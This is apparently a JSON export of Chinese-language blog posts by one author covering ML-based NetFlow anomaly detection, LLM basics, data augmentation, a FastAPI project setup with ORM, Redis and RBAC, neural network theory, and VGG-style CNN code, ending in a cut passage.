[{"id":"b429302f99829f88df9f7f39d9b7a9fe","title":"使用监督机器学习算法检测NetFlow网络流量中的异常","content":"机器学习算法在异常网络流量监测中的应用Detecting Network Anomalies in NetFlow Traffic with Machine Learning Algorithms\n比较三种广泛使用的传统 ML 算法：逻辑回归 (LR)、朴素贝叶斯分类器 (NB) 和随机森林 (RF)，以及深度学习 (DL) 算法、递归神经网络 (RNN)。评估这些不同的 ML 模型在检测各种类型的网络异常(包括入侵尝试、拒绝服务 (DoS) 攻击和内部威胁)方面的性能\n相关工作\nAnomaly detection in netflow network traffic using supervised machine learning algorithms\n\n在 UNSW-NB15 数据集上评估随机梯度下降 (SGD)、支持向量机(SVM)、K最近邻(KNN)、高斯朴素贝叶斯 (GNB)、决策树 (DT)、RF 和 AdaBoost (AB) \nRF 分类器是最有效的，通过利用数据集的代表性子集，实现了 97.68% 的 F1 分数和 98.47% 的 AUC 分数。\n\n\nPerformance of machine learning techniques in anomaly detection with basic feature selection strategy-a network intrusion detection system\n\n出了一种使用机器学习将来自网络入侵检测系统 (NIDS)的传入网络流量分类为正常或异常的方法\n\n\nDesign and development of rnn anomaly detection model for iot networks\n\n介绍了一种用于物联网网络异常检测的新型 DL 方法，该方法利用 LSTM、BiLSTM 和 GRU 变体以及混合 CNN-RNN 模型\n\n\nNetwork anomaly detection using deep learning techniques\n\n提出了一种使用卷积神经网络 (CNN) 解决网络异常的新方法\n作者提出了一个为这项任务量身定制的一维 CNN 模型。最初，网络流量数据分为 TCP、UDP 和其他协议。随后，每个类别都经过独立处理。在模型训练之前使用卡方技术进行特征选择，然后进行过采样以解决类不平衡问题\n\n\nReal-time detection of network traffic anomalies in big data environments using deep learning models\n\n\n数据集\nBoT IoT、IoT-NI、IoT-23、MQTT、MQTTset、loT-DS2\n\n\n方法和实验设计整体思路就是先数据预处理，包括数据清洗、标签编码、归一化、特征选取、类平衡，然后交给不同算法训练，评估比较不同算法的结果。\n\nA. Data Preprocessing\n使用标签编码将分类变量(如协议)编码为数字表示。(这种方法涉及为变量中的每个类别分配一个唯一的数值，将分类数据转换为适合 ML 算法的格式。选择标签编码是因为它在保持分类特征中的序数关系方面简单而有效)。\n归一化：此外，这些数值特征将被归一化，以标准化它们在数据集中的比例。这种归一化是使用 Min-Max 缩放技术实现的，其中每个特征 X 都转换为 0 到 1 范围内的值。\n\nB. Feature Engineering\n\n根据从 RF 模型获得的重要性分数来选择前 10 个最相关的特征。\n最相关的特征主要与字节数、流持续时间以及与 TCP 窗口相关的一些特征相关。\n结合了数据重采样技术来解决数据集中的类不平衡问题，确保异常检测模型在平衡的数据集上进行训练。类不平衡是异常检测任务中的一个常见问题，其中少数类明显小于多数类，这可能导致模型性能有偏差。\n\nC. SMOTE(合成少数类过采样技术)Synthetic Minority Over-sampling Technique (SMOTE)意为****合成少数类过采样技术****。SMOTE具体功能是为少数类生成合成样本，以实现更均衡的类分布。SMOTE 的工作原理是根据现有少数类样本的特征空间相似性合成新的少数类实例。\nD.模型\nLR：这是一种用于二元分类任务的基本统计方法。LR 模型使用 logistic 函数估计给定实例属于特定类的概率\nNB ：是一个基于贝叶斯定理的概率分类器，特征之间具有很强的独立性假设。\nRF: 是一种集成学习技术，它构建多个 DT 并结合这些树的预测，以改进分类并减少过拟合。\nRNN: 循环神经网络\n\n实验结果\n端口分布\n\n源端口：主要集中在超过 30,000 的值\n\n\n目标端口：集中在较低的值附近\n\n\n\n\n\n\n协议分布：TCP 是异常样本中使用最常用的协议\n\n\n模型评估：\n\n评估指标：\n\n其中，(TP)代表真正例，(TN)代表真负例，(FP)代表假正例，(FN)代表假负例\n准确率（Acc）：衡量的是所有实例中正确分类的实例所占的比例。其计算公式为： $$Acc &#x3D; \\frac{TP + TN}{TP + TN + FP + FN}$$\n精确率（Pre）侧重于正预测的正确性，其计算公式为： $$Pre &#x3D; \\frac{TP}{TP + FP}$$\n召回率（Rec）强调模型检测特定类所有相关实例的能力，其计算公式为：  $$Rec &#x3D; \\frac{TP}{TP + FN} $\nF1值（F1）是精确率和召回率的平衡度量，定义为：  $$F1 &#x3D; 2\\times\\frac{Pre\\times Rec}{Pre + Rec} $$\nAUC表示受试者工作特征曲线（ROC）下的面积，该曲线绘制了不同阈值设置下的真正例率（TPR）与假正例率（FPR）。其计算公式为： $$AUC &#x3D; \\int_{0}^{1} TPR(FPR^{-1}(u))du $$ 其中，$$TPR &#x3D; \\frac{TP}{TP + FN} $$，$$FPR &#x3D; \\frac{FP}{FP + TN} $$ 。\n\n\n各个模型的指标:\n\n\n\nRF 模型在所有指标中表现最佳, 在区分正常实例和异常实例方面表现出稳健性\n\n\n\n\n","slug":"使用监督机器学习算法检测NetFlow网络流量中的异常","date":"2025-03-07T11:19:15.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"85f934e2e8fb50a8bd6f24432b88250f","title":"ML LLM导论","content":"概述\n强调了预训练、监督学习和增强学习在模型训练中的重要性；\n以及如何通过提供明确指示和示例来提高模型的表现。\n\n原理ChatGPT的运作原理基于文字接龙\n输入问题后，AI通过预测下一个最可能的字来生成答案。这种生成式AI的方式让它能够灵活应对各种提问，并提供合理的回答。\n语言模型的输出基于几率分布，通过掷骰子的方式决定最终的输出符号。这个过程使得每次生成的答案可能不同，反映了模型的随机性和灵活性。\n它的生成过程是基于已输入的内容进行文字接龙，而非基于事实，这导致了偶尔的错误信息输出。\n预训练和监督式学习\n\n预训练是人工智能成功的重要技术，尤其是在模型的持续学习和微调方面起着关键作用。这种方法使得人工智能能够更好地为人类服务，并提升其整体能力。\n\n督导式学习对模型的性能有显著影响，能够通过人类的指导提升小模型的能力。即使是较小的模型，在有良好的教学支持下，也能超越大型模型的表现。\n\n预训练后，监督微调不再需要大量的资料\n\n比喻：预训练影响天赋，监督学习是后天努力\n\n\n强化学习\n强化学习是一种新的学习方式，其中人类老师提供反馈（打分）而非直接答案，允许模型根据反馈进行自我调整。这个方法使得每个人都能参与到模型的训练中，降低了人类的工作负担。\n强化学习的基本概念是通过人类的反馈来优化模型的回答。当用户在使用模型时，提供的反馈可以帮助模型提高正确答案的概率，并降低错误答案的概率。\n","slug":"ML-LLM导论","date":"2025-02-10T08:17:47.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"0598f467e802a4ba91894d2f84383293","title":"ML 数据增强","content":"数据增强概念在训练集中使用图像增广，随机改变训练样本可以减少模型对某些属性（如位置、颜色等）的依赖，尽可能地模拟现场部署时的场景，提高模型的泛化性能\n方法语音数据\n加入不同的背景噪音\n\n图片数据\n翻转\n切割\n颜色调整\n…………\n\n\n","slug":"ML-数据增强","date":"2025-02-06T08:52:43.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"bf51339dcad20c031f2ba03575ee26be","title":"FastAPI项目 从构建到部署","content":"FastAPI项目 从构建到部署项目框架基本结构FastAPI\n\n路由, 视图\n\nAPIRouter\nInclude_router\nJinja2\n\n\n中间件\n\ncookie\nsession\nrequest, response\n\n\n安全\n\nJWT\nRBAC\nDepends\nException\n\n\n第三方库\n\n短信\n支付(微信, 支付宝)\n数据库(MySQL, pg)\n缓存(File, Redis)\n\n\n\n项目架构txt项目基础构建事件监听pythonapplication.add_event_handler(&quot;startup&quot;, startup(application))\napplication.add_event_handler(&quot;shutdown&quot;, stopping(application))启动时调用startup()函数, 关闭时调用stopping()函数\nstartup函数:\npythondef startup(app: FastAPI) -&gt; Callable:\n    &quot;&quot;&quot;\n    FastApi 启动完成事件\n    :param app: FastAPI\n    :return: start_app\n    &quot;&quot;&quot;\n    async def app_start() -&gt; None:\n        # APP启动完成后触发\n        print(&quot;启动完毕&quot;)\n        pass\n    return app_start异常错误处理pythonapplication.add_exception_handler(HTTPException, http_error_handler) # http错误 需实现http_error_handler\napplication.add_exception_handler(RequestValidationError, http422_error_handler) # 验证错误 需实现http422_error_handler\napplication.add_exception_handler(UnicornException, unicorn_exception_handler) # 启动错误 需实现unicorn_exception_handlerhttp_error_handler实现\npythonasync def http_error_handler(_: Request, exc: HTTPException):\n    &quot;&quot;&quot;\n    http异常处理\n    :param _:\n    :param exc:\n    :return:\n    &quot;&quot;&quot;\n\n    return JSONResponse(&#123;\n        &quot;code&quot;: exc.status_code,\n        &quot;message&quot;: exc.detail,\n        &quot;data&quot;: exc.detail\n    &#125;, status_code=exc.status_code)路由pythonrouter = APIRouter()\napplication.include_router(router)中间件pythonapplication.add_middleware(Middleware) # 手动实现session\n\n# session\napplication.add_middleware(\n    SessionMiddleware,\n    secret_key=&quot;session&quot;,\n    session_cookie=&quot;f_id&quot;,\n    # max_age=4\n)\n\n# 跨域请求\napplication.add_middleware(\n    CORSMiddleware,\n    allow_origins=settings.CORS_ORIGINS,\n    allow_credentials=settings.CORS_ALLOW_CREDENTIALS,\n    allow_methods=settings.CORS_ALLOW_METHODS,\n    allow_headers=settings.CORS_ALLOW_HEADERS,\n)路由\n用一个文件来统一管理路由, 避免混乱\npythonapi_router = APIRouter(prefix=&quot;/api/v1&quot;)\napi_router.post(&quot;/test/oath2&quot;, tags=[&quot;测试oath2授权&quot;])(test_oath2)\napi_router.include_router(user.router, prefix=&#39;/admin&#39;, tags=[&quot;用户管理&quot;])\napi_router.include_router(role.router, prefix=&#39;/admin&#39;, tags=[&quot;角色管理&quot;])\napi_router.include_router(access.router, prefix=&#39;/admin&#39;, tags=[&quot;权限管理&quot;])\napi_router.include_router(websocket.router, prefix=&#39;/ws&#39;, tags=[&quot;WebSocket&quot;])\napi_router.include_router(wechat.router, prefix=&#39;/wechat&#39;, tags=[&quot;微信授权&quot;])\napi_router.include_router(sms.router, prefix=&#39;/sms&#39;, tags=[&quot;短信接口&quot;])\napi_router.include_router(cos.router, prefix=&#39;/cos&#39;, tags=[&quot;对象存储接口&quot;])\n归类于总结注释:\npythonApiRouter.get(&quot;/index&quot;, tags=[&quot;api路由&quot;], summary=&quot;注册接口&quot;)(index)\n\nApiRouter.post(&quot;/login&quot;, tags=[&quot;api路由&quot;], summary=&quot;登陆接口&quot;)(login)\n\nhttp://127.0.0.1:8000/redoc api文档\n\n\nORM数据库数据库配置pythonDB_ORM_CONFIG = &#123;\n    &quot;connections&quot;: &#123;\n        &quot;base&quot;: &#123;\n            &#39;engine&#39;: &#39;tortoise.backends.mysql&#39;,\n            &quot;credentials&quot;: &#123;\n                &#39;host&#39;: os.getenv(&#39;BASE_HOST&#39;, &#39;127.0.0.1&#39;),\n                &#39;user&#39;: os.getenv(&#39;BASE_USER&#39;, &#39;root&#39;),\n                &#39;password&#39;: os.getenv(&#39;BASE_PASSWORD&#39;, &#39;123456&#39;),\n                &#39;port&#39;: int(os.getenv(&#39;BASE_PORT&#39;, 3306)),\n                &#39;database&#39;: os.getenv(&#39;BASE_DB&#39;, &#39;base&#39;),\n            &#125;\n        &#125;,\n    &#125;,\n    &quot;apps&quot;: &#123;\n        &quot;base&quot;: &#123;&quot;models&quot;: [&quot;models.base&quot;], &quot;default_connection&quot;: &quot;base&quot;&#125;\n    &#125;,\n    &#39;use_tz&#39;: False,\n    &#39;timezone&#39;: &#39;Asia/Shanghai&#39;\n&#125;\n\n\nasync def register_mysql(app: FastAPI):\n    # 注册数据库\n    register_tortoise(\n        app,\n        config=DB_ORM_CONFIG,\n        generate_schemas=False, # 是否自动创建数据库\n        add_exception_handlers=True,\n    )\n可先完成代码, 后直接生成表, 防止数据类型冲突\n\n数据库模型示例pythonclass User(Model):\n    username = fields.CharField(null=True, max_length=20, description=&quot;用户名&quot;)\n    type = fields.BooleanField(default=False, description=&quot;用户类型 True:超级管理员 False:普通管理员&quot;)\n    password = fields.CharField(null=True, max_length=255)\n    nickname = fields.CharField(default=&#39;binkuolo&#39;, max_length=255, description=&#39;昵称&#39;)\n    u_phone = fields.CharField(null=True, description=&quot;手机号&quot;, max_length=11)\n    u_email = fields.CharField(null=True, description=&#39;邮箱&#39;, max_length=255)\n    full_name = fields.CharField(null=True, description=&#39;姓名&#39;, max_length=255)\n    u_status = fields.IntField(default=0, description=&#39;0未激活 1正常 2禁用&#39;)\n    head_img = fields.CharField(null=True, max_length=255, description=&#39;头像&#39;)\n    sex = fields.IntField(default=0, null=True, description=&#39;0未知 1男 2女&#39;)\n    remarks = fields.CharField(null=True, max_length=30, description=&quot;备注&quot;)\n    client_host = fields.CharField(null=True, max_length=19, description=&quot;访问IP&quot;)\n    create_time = fields.DatetimeField(auto_now_add=True, description=&#39;创建时间&#39;)\n    update_time = fields.DatetimeField(auto_now=True, description=&quot;更新时间&quot;)\n\n    class Meta:\n        table_description = &quot;用户&quot;\n        table = &quot;user&quot;缓存数据库Redis连接配置pythonasync def sys_cache() -&gt; Redis:\n    &quot;&quot;&quot;\n    系统缓存\n    :return: cache 连接池\n    &quot;&quot;&quot;\n    # 从URL方式创建redis连接池\n    sys_cache_pool = aioredis.ConnectionPool.from_url(\n        f&quot;redis://&#123;os.getenv(&#39;CACHE_HOST&#39;, &#39;127.0.0.1&#39;)&#125;:&#123;os.getenv(&#39;CACHE_PORT&#39;, 6379)&#125;&quot;,\n        db=os.getenv(&#39;CACHE_DB&#39;, 0),\n        encoding=&#39;utf-8&#39;,\n        decode_responses=True\n    )\n    return Redis(connection_pool=sys_cache_pool)数据库查询pythonasync def test_my_redis_depends(today: int, cache: Redis = Depends(sys_cache)):\n    # 连接池放在依赖注入\n    # await cache.set(name=&quot;today&quot;, value=today)\n    await cache.set(name=&quot;ex_today&quot;, value=today, ex=60) # ex 过期时间\n    # value = await cache.get(&quot;today&quot;)\n    return success(msg=f&quot;今天是&#123;today&#125;号&quot;, data=[])中间件pythonapplication.add_middleware(\n    CORSMiddleware,\n    allow_origins=settings.CORS_ORIGINS,\n    allow_credentials=settings.CORS_ALLOW_CREDENTIALS,\n    allow_methods=settings.CORS_ALLOW_METHODS,\n    allow_headers=settings.CORS_ALLOW_HEADERS,\n)Sessionpython    async def __call__(self, scope: Scope, receive: Receive, send: Send) -&gt; None:\n        if scope[&quot;type&quot;] not in (&quot;http&quot;, &quot;websocket&quot;):  # pragma: no cover\n            await self.app(scope, receive, send)\n            return\n        start_time = time.time()\n        req = Request(scope, receive, send)\n        if not req.session.get(&quot;session&quot;):\n            req.session.setdefault(&quot;session&quot;, random_str())RBAC权限设计RBAC (Role-Based Access Control – 基于角色（Role）的访问控制)简单来说，就是通过将权限分配给-&gt;角色，再将角色分配给-&gt;用户，来实现对系统资源的访问控制\n一个用户拥有若干角色，每一个角色拥有若干权限。这样，就构造成“用户-角色-权限”的授权模型。在这种模型中，用户与角色之间，角色与权限之间，一般者是多对多的关系\n\n角色（Role）：角色是指在系统中具有一组相关权限的抽象概念，代表了用户在特定上下文中的身份或职能，例如管理员、普通用户等。\n权限（Permission）：权限是指对系统资源进行操作的许可，如读取、写入、修改等。权限可以被分配给角色。\n用户（User）：用户是指系统的实际使用者，每个用户可以被分配一个或多个角色。\n分配（Assignment）：分配是指将角色与用户关联起来，以赋予用户相应的权限。\n\n权限控制流程\n\n权限表\n\n","slug":"FastAPI项目-从构建到部署","date":"2024-09-24T09:31:51.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"23f2ddd5bdc180cd3f2c05e6b37a137d","title":"ML 理论基础","content":"理论基础讨论前向传播和反向传播的流程？前向传播\n\n在输入层输入特征向量, 传递到隐藏层\n在隐藏层不断计算出每一层神经元得到的结果\n通过激活函数得到的输出\n将输出传递到下一层\n输出层: 在隐藏层最后的输出经过激活函数后, 得到最终的预测值\n\n反向传播\n\n通过前向传播得到网络的预测值, 利用损失函数, 计算输出层的损失\n\n从输出层开始, 计算损失对输出层的梯度, 并逐层反向传播该梯度\n\n其后每一层通过求导的链式法则, 利用上一层传递来的梯度, 计算当前层的损失函数对各参数的梯度\n\n根据计算得到的梯度, 利用优化算法(如梯度下降), 计算并更新参数, 减少损失值\n\n\n解释梯度下降法, 并结合梯度下降法讲讲神经网络工作的流程解释梯度下降法\n梯度下降算法时一种用于最小化损失函数的优化算法, 通过调整神经网络中的参数来优化模型\n梯度时损失函数对参数的(导数)偏导, 直观体现为损失函数下降最快的方向, 沿着该方向调整参数可以使损失减小\n\n算法公式为, 其中α为学习率, J为代价函数\n\n神经网络工作流程\n\n初始化参数, 如对y = W * x + b的W和b进行随机初始化\n输入数据, 进行前向传播, 将数据通过网络逐层从输入层传递到输出层\n在隐藏层的各层进行指定的计算并通过激活函数得到输出, 逐层前线传播\n在输出层得到预测值\n利用损失函数计算输出层的预测值的损失\n从输出层开始, 反向逐层计算损失函数对于各参数的梯度(反向传播)\n根据梯度下降公式W = W - α * L&#39;(W, b)和b = b - α * L&#39;(W, b)(偏导打不出来)更新参数, 其中L是损失函数, α是学习率\n重复上述的前向传播和反向传播, 进行多次迭代训练, 知道损失函数收敛到一个较小的值\n\n谈谈你对损失函数的理解, 并解释交叉熵损失函数的原理损失函数\n数据在经过模型的处理后会得到一个预测值, 预测值和真实值之间往往有所差距, 这个差距越小就说明模型预测的越准确, 因此在机器学习中, 我们希望这个差距尽可能小。 损失函数就是可以体现出这个差距的函数, 在神经网络中, 损失函数接收模型的预测值, 并计算预测值与真实值的差距, 为接下来的反向传播提供数据, 进而提供更新模型参数的方向\n交叉熵损失函数\n在二分类问题中交叉熵损失函数为:\ntxtL = −[y*log(y^) + (1−y)*log(1−y^)]y^为预测值\n当真实值为1时, 损失函数为-log(y^), y^的值越接近1, 损失越小\n同样的, 当真实值为0时, 损失函数为-log(1-y^), y^的值越接近0, 损失越小\n这样, 可以有针对性的对预测值与真实值的差距进行计算, 在二分类问题中, 一个数据的标签(即真实值)不是1就是0, 用该函数可以很好的体现预测值于真实标签的差距\n类似的, 在多分类问题中, 使用one-hot编码实现, 具体为:\nyk是真实标签在第k类上的值, 例如有5类, 实际为第一类, 则y = [1,0,0,0,0], 这样损失函数为-log(y1^), 能够准确的反映这个差距\n谈谈你对激活函数的理解激活函数的主要作用是引入非线性因素, 让数据进行非线性变换, 使神经网络可以拟合复杂的非线性关系\n如果没有用激活函数, 神经网络只会执行线性变换, 每一层的输入都是上一层输出的线性变换, 这样, 即使网络有很多层, 也只相当于一个单层线性模型, 不能处理更加复杂的关系\n比如, 一个隐藏层为h(1) = W(1)*x + b(1), 另一个为&#96;&#96;h(2) &#x3D; W(2)*x + b(2)&#96;, 那么经过两层的计算, 结果为$$h(2)&#x3D;W(2)(W(1)x+b(1))+b(2)    &#x3D;(W(2)W(1))x+(W(2)b(1)+b(2))    &#x3D;W’x + b’$$仍然是线性变换, 那么这么多层的隐藏层就没有意义了, 因为一层就能处理线性组合, 这时最终的输出也仍然是线性组合\n如果在这两个层之间引入激活函数, 神经网络的层与层之间不再是简单的线性组合, 而是产生了更加复杂的的非线性关系\n解释梯度消失和梯度爆炸, 并给出你觉的有效的解决方法梯度消失和梯度爆炸\n假设一个神经网络有3个隐藏层, 其损失函数为L, 激活函数为o, 输出为y\n即$$y^{(i)} &#x3D; o(z^{(i)})) &#x3D; o(W^{(i)}x^{(i)} + b^{(i)})$$ 例如, 其第3层的输出为$$y^{(3)} &#x3D; o(z^{(3)})&#x3D; o(W^{(3)}h^{(3)} + b^{(3)})$$根据反向传播的原理, 第1层参数的梯度计算公式为$$\\frac{∂L}{∂W^{(1)}}&#x3D;\\frac{∂L}{∂y^{(3)}}\\frac{∂y^{(3)}}{∂z^{(3)}}\\frac{∂z^{(3)}}{∂x^{(3)}}\\frac{∂x^{(3)}}{∂z^{(2)}}\\frac{∂z^{(2)}}{∂x^{(2)}}\\frac{∂x^{(2)}}{∂z^{(1)}}\\frac{∂z^{(1)}}{∂W^{(1)}}$$也就是$$\\frac{∂L}{∂W^{(1)}}&#x3D;\\frac{∂L}{∂y^{(3)}}o’(z^{(3)})W^{(3)}o’(z^{(2)})W^{(2)}o’(z^{(1)})$$如果激活函数o为sigmoid函数, 其导数o&#39;(x) = o(x)(1-o(x)), 最大值为1&#x2F;4, 同样的, 如果使用tanh作为激活函数, 其导数也小于1\n如果初始的W小于1, 那么|W*o’(z)|&lt;&#x3D; 1&#x2F;4, 经过很多层的求导后, 梯度会因为指数级的下降而将变得非常小, 使参数变化非常缓慢, 引起了梯度消失问题\n如果梯度消失, 梯度值几乎会变成0那么不管怎么选择学习率,训练都不会有进展, 梯度消失对网络底部层尤为严重, 仅仅顶部层能训练的较好, 无法让神经网络更深\n同样的, 如果初始W比较大, 使|W*o’(z)| &gt; 1, 前面的层的梯度乘W*o’(z)的次数比后面的层更多, 前面的层比后面的层的梯度变化更快, 梯度会因为指数爆炸变得非常大, 引起梯度爆炸问题\n梯度爆炸可能会导致数据超出值域, 会让模型对学习率很敏感, 需要在训练过程中不断调整学习率\n梯度消失和梯度爆炸的解决方法\n\n使你用ReLU激活函数, relu的导数要么是1, 要么是0, 导数是1的时候就不存在梯度消失了\n\n批量归一化(BN层), 使得每层的激活值的分布具有固定的均值(0)和方差(1), 使得激活输入值落在非线性函数对输入比较敏感的区域,  这样输入的小变化就会导致损失函数较大的变化, 使得让 梯度变大, 避免梯度消失问题产生\n\n正则化, 梯度爆炸是由于W太大, 正则化可以防止其过大, 从而防止梯度爆炸\n\n采用合适的权重初始化方法, 避免初始的权重过小或过大, 比如通过将权重初始化为从均值为0、方差为 1&#x2F;fan_avg的分布中的值(xavier初始化)\n\n梯度裁剪, 强行限制梯度的大小, 防止梯度爆炸\n\n使用残差网络\nResNet的操作相当于$$y’’ &#x3D; g(f(x))变为y’’&#x3D;f(x) + g(f(x))$$这样其导数$$\\frac{∂y’’}{∂w}&#x3D;\\frac{∂y}{∂w}+\\frac{∂y’}{∂w}$$即使y&#39;的导数非常小, 加上y的导数后也不会太小\n\n\n解释过拟合, 欠拟合, 并给出你觉得有效的解决方法过拟合\n模型过于强调拟合原始数据, 这样就忽略了预测新数据这个算法本质。对于原始数据, 该模型表现的非常好, 但是对于一个新数据, 其表现很可能会很差, 即不能很好的泛化\n直观表现如下\n模型过拟合的原因主要有:\n\n模型容量太大, 过于追求拟合所有细节\n训练数据数量太少\n训练数据存在噪声的干扰\n\n解决过拟合的方法有:\n\n增加训练数据的量\n调整训练轮次和学习率等参数\n降低模型的复杂度(减小模型容量), 过拟合说明模型的拟合能力过强, 将模型简化可以弱化其拟合能力\n正则化(regularization), 在损失函数中添加正则项, 可以使模型的权重w保持在较小的值, 避免模型过于复杂\n每轮训练后, 实时保存模型, 输出模型在测试集上损失, 最后选取在测试集上损失最小的模型\n\n欠拟合\n模型无法很好的适应训练集, 会有较大的误差\n模型出现欠拟合的原因一般有:\n\n模型过于简单\n特征不足\n训练轮次太少\n\n如果欠拟合, 说明模型的学习能力不足, 增加训练数据的数量基本上不能解决问题\n因此, 欠拟合的解决方法有\n\n提高模型的复杂度, 可以增加神经网络隐藏层的层数, 或者直接舍弃原来的算法, 用更加复杂的算法模型\n调整参数, 比如修改学习率, 训练轮次, 等等\n引入更多有用的特征\n降低正则化的约束, 正则化本来是防止模型过拟合, 但是如果模型欠拟合了, 那么就说明不需要这么强的约束, 可以降低正则化参数, 或者直接去除正则化项\n\n讨论你对和正则化(regularization)和归一化(normallization)的认识正则化\n正则化是用来防止模型过拟合的方法\n例如, 模型为h(x) = Wx + b, 损失函数为L = 1/2m * (∑(h(x) - y)^2)\n将代价函数修改为(L2正则化):$$L &#x3D; \\frac{1}{2m}(∑^m_{i&#x3D;0}(h(x^i) - y^i)^2) + \\frac{λ}{2m}∑^n_{i&#x3D;0}W^2_i$$即添加λ*xx项也就是正则化项(惩罚项), 其中λ为正则化参数\n进行梯度下降时, 某个参数的更新为:$$W_i &#x3D; W_i - lr\\frac{∂L}{∂W_i}$$损失函数对参数W_i的梯度为$$\\frac{∂L}{∂W_i} &#x3D; - \\frac{1}{m}∑^m_{j&#x3D;1}(y_j - \\hat{y_j})\\frac{∂\\hat{y_j}}{∂W_i} + λW_i$$则$$W_i&#x3D;(1-lr*λ)W_i-λ\\frac{∂L}{∂W_i}$$如果W_i较大, 那么梯度也较大, 其更新的步长也更大, 其被压缩的程度, 也就是惩罚力度也更大, 反之处罚力度较小\n正则化参数λ的大小可以调整惩罚的力度, 如果λ太小, 正则化参数的影响就太小, 达不到效果, 如果太大, 则会对所有的参数都进行很大力度的惩罚, 甚至使其都为0\n这样, 通过正则化, 可以防止某些参数的影响过大, 使其保持较小的值, 限制了模型的复杂性, 也就能够解决过拟合\n归一化\nnormalization是一种特征缩放的方法, 是一种常用的数据预处理方法, 大部分是指把特征数据范围都缩放到(0, 1)或(-1, 1)之间例如: 左边是未进行归一化的数据, x的范围是(0, 100), y的范围是(0,10), 右边是进行归一化后的数据, 范围都在(0, 1)之间\n\n为什么要归一化:\n\n以上图中的数据为例, 不同特征的数据范围可能相差很大, 导致某些特征对模型的训练产生较大的影响, 而其他的特征的影响可能会被忽略, 这样模型可能就不太准确\n\n如果不进行归一化, 因为不同特征的范围相差较大, 直观来看, 数据会变”扁”, 进行梯度下降的时候要走很多的”弯路”\n而进行归一化之后, 可以少走很多弯路, 能让训练速度加快\n\n\n\n谈谈你对卷积神经网络的理解, 并讨论对于cnn具体参数都是什么和如何选择卷积神经网络是一种用来处理图像数据的深度学习模型, 其核心是通过卷积操作提取图像的局部特征, 卷积神经网络通常包括卷积层, 非线性层, 池化层, 全连接层, 这些层按照一定顺序叠加在一起, 逐步提取图像特征, 最后通过全连接层进行分类或其他任务\n在处理图像时, 由于图像特征的数据量太大(像素太多), 导致计算成本太高, 效率很低。\n 同时, 在传统的全连接神经网络中, 每个神经元都与前一层的每个神经元相连, 这会导致参数数量暴增。而通过卷积操作, 使用相同的卷积核处理整张图像, 这样不仅大幅减少了参数数量, 还保留了图像的空间结构\n参数及选择\n\nlearning rate 学习率, 一般啊在1e-1和1e-4之间选择, 需要手动调整\n\nepochs 训练轮次 一般轮次设定为几十到几百次, 不过一般不用全部训练完, 可以通过早停法提前结束\n\nbatch_size 批量大小, 根据设备性能选择, 常用的批量大小有32, 64, 128, 256\n\n网络层数 根据模型任务的复杂度选择\n\n正则化参数 \n\ndropout比例 0.2~0.5之间选择\nL2 正则化系数lambda 常用 1e-4 到 1e-2 之间的值\n\n\nkernel size 卷积核大小 通常用3x3或5x5, 较小的卷积核有助于捕捉细节, 较大的卷积核有助于获取更广泛的特征\n\n卷积核个数 每层卷积的卷积核个数决定了特征图的深度, 通常从 32 或 64 个卷积核开始, 随着网络的加深逐渐增加卷积核数量\n\npadding 填充, 在输入特征图的每一边添加一定数目的行列, 常见的选择是 “same” 填充(保持特征图尺寸不变)或 “valid” 填充(不添加填充), 根据任务需求选择合适的填充方式\n\nstride 步长, 卷积核经过输入特征图的采样间隔, 常用的步长是1或2, 大的步长可以减少特征图尺寸, 但是会损失信息\n\npooling size 池化大小 通常设置为2x2\n\n\n1*1的卷积有什么作用\n1x1卷积核的高和宽都等于1, 意味着它不会识别空间信息, 因为他每次只看一个空间像素所以不会去识别通道中的空间信息\n\n1x1卷积不识别空间模式, 只是融合不同通道的信息\n\n相当于输入形状为n_h*n_w*c, 权重为c_o*c_i的全连接层\n\n\n作用\n\n融合不同通道的信息, 可以认为是不做空间的匹配, 只是在输入层直接做输入通道和输出通道的融合, 等价于将整个输入拉成一个向量, 通道数等于特征的数量, 卷积核就相当于一个全连接层\n\n1x1卷积可以在不改变输入特征图空间分辨率的情况下, 改变其通道数, 卷积层的输出的通道数由卷积核的个数决定, 通过设置1x1卷积核的数量, 可以做到升维&#x2F;降维\n\n\n卷积神经网络中池化的作用\n提取主要特征, 例如, 最大池化可以选择区域内的最大值, 可以帮助无论更好地捕捉边缘, 角点等特征\n\n池化可以减少特征图的空间尺寸(宽和高), 降低了计算的复杂度, 提高效率\n\n缓解卷积层对位置的敏感性, 也就是增强位置不变性, 例如2x2最大池化将卷积输出增加左右各一个像素, 这样就允许了1个像素的移位, 缓解了卷积层对位置的敏感性\n\n\n\n","slug":"ML-理论基础","date":"2024-09-07T16:31:52.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"1084723f5f84c83e372c0f57ae570bd1","title":"ML 现代卷积神经网络","content":"现代卷积神经网络LeNet\nAlexNetAlexNet和LeNet的设计理念和架构非常相似，但也存在显著差异。本质上来说，AlexNet是改进后的更深更大的LeNet\n主要改进:\n\n全连接层的隐藏层后加入了丢弃层\n\nsigmoid –&gt; ReLU (减缓梯度消失)\n\n平均池化 –&gt; 最大池化\n\n进行了数据增强\n\n\n\nLeNet与AlexNet\nVGG(使用块的网络)VGG块：可看作更大更深的AlexNet\nVGG使用可重复的卷积块来构建深度卷积神经网络\nVGG架构：\n\n替换掉AlexNet整个卷积的架构，形成n个VGG块串在一起, 多个VGG块后接全连接层\n\n不同的卷积块个数和超参数可以达到不同复杂度的变种(VGG16, VGG19)\n\n\n\nvgg块的实现\npydef vgg_block(num_convs, in_channels, out_channels):\n    layers = []\n    for _ in range(num_convs):\n        layers.append(nn.Conv2d(in_channels, out_channels,\n                                kernel_size=3, padding=1))\n        layers.append(nn.ReLU())\n        in_channels = out_channels\n    layers.append(nn.MaxPool2d(kernel_size=2,stride=2))\n    return nn.Sequential(*layers)vgg网络的实现\npythonconv_arch = ((1, 64), (1, 128), (2, 256), (2, 512), (2, 512))\n\ndef vgg(conv_arch):\n    conv_blks = []\n    in_channels = 1\n    # 卷积层部分\n    for (num_convs, out_channels) in conv_arch:\n        conv_blks.append(vgg_block(num_convs, in_channels, out_channels))\n        in_channels = out_channels\n\n    return nn.Sequential(\n        *conv_blks, nn.Flatten(),\n        # 全连接层部分\n        nn.Linear(out_channels * 7 * 7, 4096), nn.ReLU(), nn.Dropout(0.5),\n        nn.Linear(4096, 4096), nn.ReLU(), nn.Dropout(0.5),\n        nn.Linear(4096, 10))\n\nnet = 